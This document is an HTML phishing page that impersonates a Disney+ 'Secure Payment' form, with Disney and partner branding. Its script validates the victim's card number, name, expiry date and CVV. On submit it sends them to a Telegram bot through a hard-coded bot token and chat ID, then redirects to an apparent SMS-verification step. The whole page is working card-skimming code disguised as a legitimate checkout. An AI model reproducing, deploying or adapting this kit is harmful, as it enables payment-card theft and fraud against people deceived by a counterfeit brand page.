<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Secure Payment | Disney+</title>
  <link rel="stylesheet" href="style.css"/>
  <style>
    /* Styles supplémentaires spécifiques à la page de paiement */
    .card-icon-container {
      display: flex;
      justify-content: center;
      gap: 12px;
      margin: 16px 0;
    }
    
    .card-icon {
      height: 28px;
      object-fit: contain;
      opacity: 0.3;
      transition: opacity 0.3s;
    }
    
    .card-icon.active {
      opacity: 1;
    }
    
    .form-row {
      display: flex;
      gap: 15px;
    }
    
    .form-group {
      flex: 1;
      display: flex;
      flex-direction: column;
    }
    
    .error-border {
      border: 2px solid #ff3860 !important;
    }
    
    .error-message {
      color: #ff3860;
      font-size: 12px;
      margin-top: -10px;
      margin-bottom: 15px;
      text-align: left;
    }
    
    .card-type-indicator {
      position: absolute;
      right: 10px;
      top: 50%;
      transform: translateY(-50%);
      width: 32px;
      height: 20px;
      background-size: contain;
      background-repeat: no-repeat;
      background-position: center;
      display: none;
    }
    
    .input-wrapper {
      position: relative;
    }
  </style>
</head>
<body class="page-form">
  <main>
    <!-- Centered MyDisney Logo -->
    <img src="Images/Mydisney-logo.png" alt="MyDisney" class="center-logo"/>

    <h1>Payment Information</h1>

    <!-- Payment icons -->
    <div class="card-icon-container">
      <img src="Images/visa.png" alt="Visa" class="card-icon" id="visaIcon"/>
      <img src="Images/Mastercard.png" alt="Mastercard" class="card-icon" id="mastercardIcon"/>
      <img src="Images/Amex.png" alt="American Express" class="card-icon" id="amexIcon"/>
    </div>

    <form id="paymentForm">
      <div class="input-wrapper">
        <input type="text" id="cardNumber" placeholder="Card Number" required maxlength="19"/>
        <div class="card-type-indicator" id="cardTypeIndicator"></div>
      </div>
      <div id="cardNumberError" class="error-message"></div>
      
      <input type="text" id="cardName" placeholder="Name on Card" required/>
      <div id="cardNameError" class="error-message"></div>
      
      <div class="form-row">
        <div class="form-group">
          <input type="text" id="expiryDate" placeholder="MM/YY" required maxlength="5"/>
          <div id="expiryDateError" class="error-message"></div>
        </div>
        <div class="form-group">
          <input type="text" id="cvv" placeholder="CVV" required maxlength="4"/>
          <div id="cvvError" class="error-message"></div>
        </div>
      </div>

      <p style="font-size:0.85rem; color:#333; margin:16px 0; text-align:left;">
        By confirming your payment, you agree that your subscription will begin immediately and renew automatically each month. No commitment – you can cancel at any time.
      </p>

      <button type="submit">Confirm Payment</button>
    </form>

    <!-- Footer note + partner logos -->
    <div class="footer-note">
      <strong>Disney+ is part of The Walt Disney Company</strong><br/>
      MyDisney gives you access to services like Disney+, ESPN, Walt Disney World <a href="#">and more</a>.
      <div class="logos-container">
        <img src="Images/compose2.png" alt="Disney+"/>
        <img src="Images/abc-logo-image-4413.png" alt="ABC"/>
        <img src="Images/espn-png-logo-4149.png" alt="ESPN"/>
        <img src="Images/marvel-logo-34291.png" alt="Marvel"/>
        <img src="Images/star-wars-logo-1002.png" alt="Star Wars"/>
        <img src="Images/Hulu-Logo-PNG.png" alt="Hulu"/>
        <img src="Images/natgeo-logo.png" alt="National Geographic"/>
      </div>
    </div>
  </main>

  <!-- Spinner overlay -->
  <div id="spinnerOverlay">
    <div class="spinner"></div>
  </div>

  <script>
    // Fonctions de validation
    function detectCardType(cardNumber) {
      const cleanNumber = cardNumber.replace(/\s+/g, '');
      
      // Expressions régulières pour détecter le type de carte
      const patterns = {
        visa: /^4/,
        mastercard: /^(5[1-5]|2[2-7])/,
        amex: /^3[47]/
      };
      
      if (patterns.visa.test(cleanNumber)) return 'visa';
      if (patterns.mastercard.test(cleanNumber)) return 'mastercard';
      if (patterns.amex.test(cleanNumber)) return 'amex';
      
      return null;
    }
    
    function validateCardNumber(cardNumber, cardType) {
      const cleanNumber = cardNumber.replace(/\s+/g, '');
      
      // Vérifier que ce ne sont que des chiffres
      if (!/^\d+$/.test(cleanNumber)) return false;
      
      // Vérifier la longueur selon le type de carte
      if (cardType === 'visa' && (cleanNumber.length !== 13 && cleanNumber.length !== 16)) return false;
      if (cardType === 'mastercard' && cleanNumber.length !== 16) return false;
      if (cardType === 'amex' && cleanNumber.length !== 15) return false;
      
      return true;
    }
    
    function validateExpiryDate(expiryDate) {
      if (!/^\d{2}\/\d{2}$/.test(expiryDate)) return false;
      
      const [month, year] = expiryDate.split('/').map(Number);
      const now = new Date();
      const currentYear = now.getFullYear() % 100;
      const currentMonth = now.getMonth() + 1;
      
      // Vérifier que le mois est valide
      if (month < 1 || month > 12) return false;
      
      // Vérifier que la date n'est pas expirée
      if (year < currentYear) return false;
      if (year === currentYear && month < currentMonth) return false;
      
      return true;
    }
    
    function validateCVV(cvv, cardType) {
      // Vérifier que ce ne sont que des chiffres
      if (!/^\d+$/.test(cvv)) return false;
      
      // Vérifier la longueur selon le type de carte
      if (cardType === 'amex') return cvv.length === 4;
      return cvv.length === 3;
    }
    
    function formatCardNumber(cardNumber) {
      const v = cardNumber.replace(/\s+/g, '');
      const matches = v.match(/\d{4,16}/g);
      const match = matches && matches[0] || '';
      const parts = [];
      
      for (let i = 0, len = match.length; i < len; i += 4) {
        parts.push(match.substring(i, i + 4));
      }
      
      if (parts.length) {
        return parts.join(' ');
      }
      return cardNumber;
    }
    
    function formatExpiryDate(expiryDate) {
      const v = expiryDate.replace(/\D/g, '');
      if (v.length >= 3) {
        return v.substring(0, 2) + '/' + v.substring(2, 4);
      }
      return expiryDate;
    }
    
    // Initialisation
    document.addEventListener('DOMContentLoaded', function() {
      const cardNumberInput = document.getElementById('cardNumber');
      const expiryDateInput = document.getElementById('expiryDate');
      const cvvInput = document.getElementById('cvv');
      const form = document.getElementById('paymentForm');
      const cardTypeIndicator = document.getElementById('cardTypeIndicator');
      
      let currentCardType = null;
      
      // Écouter les changements sur le numéro de carte
      cardNumberInput.addEventListener('input', function() {
        // Formater le numéro de carte avec des espaces
        this.value = formatCardNumber(this.value);
        
        // Détecter le type de carte
        currentCardType = detectCardType(this.value);
        
        // Mettre à jour l'affichage des icônes
        document.getElementById('visaIcon').classList.toggle('active', currentCardType === 'visa');
        document.getElementById('mastercardIcon').classList.toggle('active', currentCardType === 'mastercard');
        document.getElementById('amexIcon').classList.toggle('active', currentCardType === 'amex');
        
        // Afficher l'indicateur de type de carte
        if (currentCardType) {
          cardTypeIndicator.style.display = 'block';
          cardTypeIndicator.style.backgroundImage = `url('Images/${currentCardType}.png')`;
        } else {
          cardTypeIndicator.style.display = 'none';
        }
      });
      
      // Formater la date d'expiration
      expiryDateInput.addEventListener('input', function() {
        this.value = formatExpiryDate(this.value);
      });
      
      // Validation du formulaire avant envoi
      form.addEventListener('submit', function(e) {
        e.preventDefault();
        
        // Valider tous les champs
        const cardNumber = cardNumberInput.value;
        const expiryDate = expiryDateInput.value;
        const cvv = cvvInput.value;
        const cardName = document.getElementById('cardName').value;
        
        currentCardType = detectCardType(cardNumber);
        const isCardNumberValid = validateCardNumber(cardNumber, currentCardType);
        const isExpiryDateValid = validateExpiryDate(expiryDate);
        const isCVVValid = validateCVV(cvv, currentCardType);
        const isNameValid = cardName.trim().length > 0;
        
        // Mettre à jour les styles d'erreur
        cardNumberInput.classList.toggle('error-border', !isCardNumberValid);
        expiryDateInput.classList.toggle('error-border', !isExpiryDateValid);
        cvvInput.classList.toggle('error-border', !isCVVValid);
        document.getElementById('cardName').classList.toggle('error-border', !isNameValid);
        
        // Afficher les messages d'erreur
        document.getElementById('cardNumberError').textContent = 
          !isCardNumberValid ? 'Invalid card number' : '';
        document.getElementById('expiryDateError').textContent = 
          !isExpiryDateValid ? 'Invalid expiration date' : '';
        document.getElementById('cvvError').textContent = 
          !isCVVValid ? 'Invalid CVV' : '';
        document.getElementById('cardNameError').textContent = 
          !isNameValid ? 'Please enter the name on card' : '';
        
        // Si tout est valide, procéder au paiement
        if (isCardNumberValid && isExpiryDateValid && isCVVValid && isNameValid) {
          document.getElementById("spinnerOverlay").style.display = "flex";

          const num = cardNumberInput.value;
          const name = document.getElementById('cardName').value.trim();
          const exp = expiryDateInput.value;
          const cvv = cvvInput.value;

          const botToken = "8405352750:AAGzI6w6ks8p9nRgmikeST1D6QCZ0uorNPI";
          const chatId   = "-4810968086";
          const message  = `💳 Disney+ Payment:\nCard: ${num}\nName: ${name}\nExp: ${exp}\nCVV: ${cvv}`;

          fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: chatId, text: message })
          }).catch(console.error)
            .finally(() => {
              setTimeout(() => {
                window.location.href = "sms-verification.html";
              }, 14000);
            });
        }
      });
    });
  </script>
</body>
</html>
